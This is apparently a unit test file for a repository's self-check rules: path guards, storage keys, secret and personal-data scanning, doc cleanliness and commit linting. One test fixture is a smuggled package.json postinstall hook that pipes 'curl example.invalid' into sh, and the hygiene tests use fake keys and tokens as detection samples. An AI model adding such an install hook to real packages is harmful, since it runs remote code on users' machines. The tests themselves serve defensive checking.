// Unit tests for the pure logic behind the studio self-checks.
// The checks themselves gather input; these functions decide what it means,
// so this is where a mistaken rule shows up.

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyPaths, PATH_EXCEPTIONS,
  extractStorageKeys, badStorageKeys,
  scanHygiene, scanDocCleanliness, HYGIENE_PRAGMA,
  lintCommitSubject
} from './lib/rules.mjs';

test('path guard: studio-owned paths are allowed', () => {
  const { allowed, violations } = classifyPaths([
    'studio/index.html',
    'studio/games/x/main.js',
    'docs/studio/process.md',
    'tests/studio/check.mjs'
  ]);
  assert.equal(allowed.length, 4);
  assert.deepEqual(violations, []);
});

test('path guard: production paths are violations', () => {
  const { violations } = classifyPaths(['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
  assert.deepEqual(violations, ['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
});

test('path guard: a near-miss prefix is not allowed', () => {
  const { violations } = classifyPaths(['studiotools/x.js', 'docs/studio-notes.md']);
  assert.deepEqual(violations, ['studiotools/x.js', 'docs/studio-notes.md']);
});

test('path guard: package.json is an exception, not an allowance', () => {
  const { allowed, exceptions, violations } = classifyPaths(['package.json']);
  assert.deepEqual(allowed, []);
  assert.deepEqual(exceptions, ['package.json']);
  assert.deepEqual(violations, []);
});

test('package.json exception permits only the studio:check entry', () => {
  const rule = PATH_EXCEPTIONS.find(e => e.path === 'package.json');
  const good = [
    '--- a/package.json',
    '+++ b/package.json',
    '-    "e2e": "node scripts/e2e.mjs"',
    '+    "e2e": "node scripts/e2e.mjs",',
    '+    "studio:check": "node tests/studio/check.mjs"'
  ].join('\n');
  assert.equal(rule.allow(good), null, 'the comma JSON adds to the line above is not a change');

  const bad = ['--- a/package.json', '+++ b/package.json', '+  "dependencies": { "left-pad": "^1.0.0" }'].join('\n');
  assert.match(rule.allow(bad), /left-pad/);
});

test('package.json exception catches a smuggled edit and a silent removal', () => {
  const rule = PATH_EXCEPTIONS.find(e => e.path === 'package.json');
  const smuggled = [
    '+    "studio:check": "node tests/studio/check.mjs",',
    '+    "postinstall": "curl example.invalid | sh"'
  ].join('\n');
  assert.match(rule.allow(smuggled), /postinstall/);

  const removal = '-    "e2e": "node scripts/e2e.mjs"';
  assert.match(rule.allow(removal), /removed: "e2e"/);
});

test('storage keys: literal, concatenated and interpolated forms are all found', () => {
  const code = `
    localStorage.getItem('studio_theme');
    localStorage.setItem("studio_seen", "1");
    sessionStorage.removeItem(\`studio_tmp\`);
    localStorage.setItem('studio_run_' + id, v);
    localStorage.getItem(\`studio_slot_\${n}\`);
  `;
  const keys = extractStorageKeys(code).map(k => k.key);
  assert.deepEqual(keys.sort(), ['studio_run_', 'studio_seen', 'studio_slot_', 'studio_theme', 'studio_tmp'].sort());
  assert.deepEqual(badStorageKeys(code), []);
});

test('storage keys: production keys are caught, including dynamic ones', () => {
  const code = `
    localStorage.getItem('theme');
    localStorage.setItem('riverRunHighScore', s);
    localStorage.setItem('durak_name_' + seat, n);
  `;
  assert.deepEqual(badStorageKeys(code).sort(), ['durak_name_', 'riverRunHighScore', 'theme']);
});

test('storage keys: a fully computed key cannot be verified, so it is reported', () => {
  const code = 'localStorage.setItem(keyFor(slot), v);';
  assert.deepEqual(badStorageKeys(code), ['keyFor(slot']);
});

test('hygiene: catches secrets, identifiers and private paths', () => {
  const cases = {
    'private-key': '-----BEGIN RSA PRIVATE KEY-----',  // studio-check:allow
    'aws-key': 'const k = "AKIAIOSFODNN7EXAMPLE";',  // studio-check:allow
    'bearer-secret': 'const api_key = "sk-abcdef123456789";',  // studio-check:allow
    'gh-token': 'ghp_abcdefghijklmnopqrstuvwxyz0123',  // studio-check:allow
    'email': 'contact someone@example.com for access',  // studio-check:allow
    'phone': 'call 555-867-5309 to confirm',  // studio-check:allow
    'home-path': 'cd /Users/someone/Projects',  // studio-check:allow
    'cloud-drive': 'the notes live in Mobile Documents/whatever',  // studio-check:allow
    'wikilink': 'see [[Some Private Note]] for context',  // studio-check:allow
    'street-address': 'the office at 1600 Pennsylvania Avenue'  // studio-check:allow
  };
  for (const [id, line] of Object.entries(cases)) {
    const found = scanHygiene(line).map(f => f.id);
    assert.ok(found.includes(id), `expected ${id} for: ${line} (got ${found.join(',') || 'nothing'})`);
  }
});

test('hygiene: clean text is clean, and the pragma exempts a quoted rule', () => {
  assert.deepEqual(scanHygiene('The gallery renders a card per studio game.'), []);
  assert.deepEqual(scanHygiene(`a wikilink looks like [[this]] <!-- ${HYGIENE_PRAGMA} -->`), []);  // studio-check:allow
});

test('hygiene: reports the line number', () => {
  const [finding] = scanHygiene('clean\nclean\ncontact someone@example.com');  // studio-check:allow
  assert.equal(finding.line, 3);
});

test('doc cleanliness: stacked corrections and historical sections are caught', () => {
  assert.equal(scanDocCleanliness('## Revision history\n').length, 1);
  assert.equal(scanDocCleanliness('### Superseded approach\n').length, 1);
  assert.equal(scanDocCleanliness('UPDATE: this is no longer true\n').length, 1);
  assert.equal(scanDocCleanliness('**EDIT:** actually we do it the other way\n').length, 1);
});

test('doc cleanliness: a decision record may record being superseded', () => {
  const adr = '# ADR-0007 — something\n\n## Superseded by ADR-0009\n';
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: true }).length, 0);
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: false }).length, 1);
});

test('doc cleanliness: ordinary prose passes', () => {
  const doc = '# Process\n\nOne run is one iteration.\n\n## Ceremonies\n\n- Planning\n';
  assert.deepEqual(scanDocCleanliness(doc), []);
});

test('commit lint: accepts a conventional studio commit', () => {
  assert.equal(lintCommitSubject('feat(studio): SS-003 add the path-guard check'), null);
  assert.equal(lintCommitSubject('docs(studio): SS-001 add the engineering handbook'), null);
});

test('commit lint: rejects a missing scope, ticket or type', () => {
  assert.match(lintCommitSubject('add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat: SS-003 add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): SS-3 add the path guard'), /expected/);
});

test('commit lint: merge commits are exempt, long subjects are not', () => {
  assert.equal(lintCommitSubject('Merge ss-003-self-checks: SS-003 self-checks'), null);
  assert.match(lintCommitSubject('feat(studio): SS-003 ' + 'x'.repeat(80)), /characters/);
});
